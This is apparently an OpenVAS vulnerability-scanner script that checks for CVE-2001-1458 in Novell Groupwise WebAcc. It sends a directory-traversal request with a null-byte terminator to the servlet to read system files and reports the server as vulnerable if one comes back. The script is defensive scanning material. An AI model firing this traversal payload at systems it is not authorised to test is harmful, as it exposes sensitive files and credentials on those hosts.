if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.10789" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2001-1458" );
	script_bugtraq_id( 3436 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Novell Groupwise WebAcc Information Disclosure" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2001 SecuriTeam" );
	script_dependencies( "find_service.sc", "httpver.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.securiteam.com/securitynews/6S00N0K2UM.html" );
	script_tag( name: "solution", value: "Disable access to the servlet until the author releases a patch.

  See the linked reference for additional information." );
	script_tag( name: "summary", value: "Novell Groupwise WebAcc Servlet is installed. This servlet exposes
  critical system information, and allows remote attackers to read any file." );
	script_tag( name: "solution_type", value: "Workaround" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
url = "/servlet/webacc";
if(http_is_cgi_installed_ka( port: port, item: url )){
	files = traversal_files();
	for file in keys( files ) {
		url = "/servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../" + files[file] + "%00";
		if(http_vuln_check( port: port, url: url, pattern: file )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
	exit( 99 );
}
exit( 0 );

